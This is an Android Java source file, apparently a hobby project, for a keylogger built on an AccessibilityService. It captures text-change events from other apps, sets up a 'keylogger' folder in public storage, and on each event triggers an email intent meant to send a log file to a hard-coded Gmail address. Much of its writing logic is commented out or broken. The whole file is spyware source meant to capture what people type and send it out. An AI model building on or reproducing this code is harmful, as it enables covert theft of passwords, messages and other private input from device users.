package com.example.rolax.accessibilityservice;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Environment;
import android.support.annotation.RequiresApi;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import java.io.File;
import java.io.FileOutputStream;

public class captured extends AccessibilityService {

    String archivo="registros.txt";
    File file;
    FileOutputStream archibo_escribir;

    @Override
    public void onCreate() {
        super.onCreate();

        try {
            //===================CONFIGURACION Y CREACION DE CARPETA=================
            File directorio = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PODCASTS), "/keylogger/");

            if(!directorio.exists())
            {
                directorio.mkdir();

                File ruta_sd = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PODCASTS);
                file=new File(ruta_sd.getAbsolutePath()+"/keylogger",archivo);
                file.createNewFile();

                archibo_escribir=new FileOutputStream(file);
                //fout= new OutputStreamWriter(new FileOutputStream(file));

            }

        }catch (Exception e){
            System.out.println("/////////////////// ALGO SALIO MAL: "+e.getMessage()+" //////////////////////////////");
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        final int eventType = event.getEventType();

        String eventText = "";
        switch(eventType) {

            //You can use catch other events like touch and focus
                /*
                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                    System.out.println(event.getSource());
                     eventText = "Clicked: "+event.getSource();
                     break;
                case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                     eventText = "Focused: "+event.getSource();
                     break;*/

            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                eventText = ""+event.getSource();
                break;

                /*case AccessibilityEvent.TYPE_VIEW_LONG_CLICKED:
                    eventText="Long_Clicked: "+event.getSource();
                    break;

                case AccessibilityEvent.CONTENT_CHANGE_TYPE_TEXT:
                    eventText="CHANGE TYPE TEXT: "+event.getSource();
                    break;

                case AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED:
                    eventText="TYPE_VIEW_TEXT_SELECTION_CHANGED: "+event.getSource();
                    break;

                case AccessibilityEvent.TYPE_VIEW_TEXT_TRAVERSED_AT_MOVEMENT_GRANULARITY:
                    eventText="TYPE_VIEW_TEXT_TRAVERSED_AT_MOVEMENT_GRANULARITY: "+event.getSource();
                    break;*/

        }
        eventText = eventText +"\n"+event.getText();

        //print the typed text in the console. Or do anything you want here.
        //System.out.println("ACCESSIBILITY SERVICE : "+eventText+" LONGITUD: "+eventText.length());
        escribir(eventText);
    }

    @Override
    public void onInterrupt() {

    }

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN)
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();

        //=========================VARIABLE DE SESION===============================================
        SharedPreferences prefere = getSharedPreferences("bandera",Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = prefere.edit();
        editor.putString("bandera","1");
        editor.commit();
        //==========================================================================================

        System.out.println("######### Mensaje desde la conexion ##########################");
        //===============================CONFIGURACION DEL SERVICIO=================================
        AccessibilityServiceInfo info=getServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN;
        info.notificationTimeout = 100;
        this.setServiceInfo(info);
    }

    public void escribir(String pulsacion){
        try
        {
            Intent i = new Intent(Intent.ACTION_SEND);
            i.setType("application/pdf");
            //Agrega email o emails de destinatario.
            i.putExtra(Intent.EXTRA_EMAIL, new String[] { "rolagar97@gmail.com" });
            i.putExtra(Intent.EXTRA_SUBJECT, "Envio de archivo .TXT.");
            i.putExtra(Intent.EXTRA_TEXT, "Hola te envío un archivo .TXT!");
            i.putExtra(Intent.EXTRA_STREAM,  "/data/data/com.example.rolax.keylogger/files/"+archivo);
            MainActivity.con.startActivity(Intent.createChooser(i, "Enviar e-mail mediante:"));

            /*BufferedReader fin =new BufferedReader(new InputStreamReader(openFileInput(archivo)));
            String texto= fin.readLine();
            fin.close();

            System.out.println("LEYENDO ARCHIVO: "+texto);

            FileOutputStream outputStream = openFileOutput(archivo, Context.MODE_APPEND);
            outputStream.write(pulsacion.getBytes());
            outputStream.close();*/




            /*FileWriter fw = new FileWriter(file.getAbsoluteFile(), true);
            BufferedWriter bw = new BufferedWriter(fw);
            bw.write("Hola");*/

            //File ruta_sd = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PODCASTS);
            //File f = new File(ruta_sd.getAbsolutePath()+"/keylogger", archivo);
            /*OutputStreamWriter fout= new OutputStreamWriter(new FileOutputStream(file));
            fout.append(texto+"\n");
            fout.close();
            System.out.println("YA SE ESCRIBIO: "+texto);*/
        }
        catch (Exception ex)
        { Log.e("Ficheros", "Error al escribir fichero a memoria interna");
            System.out.println("Error al escribir fichero a memoria interna: "+ ex.getMessage());}
    }
}
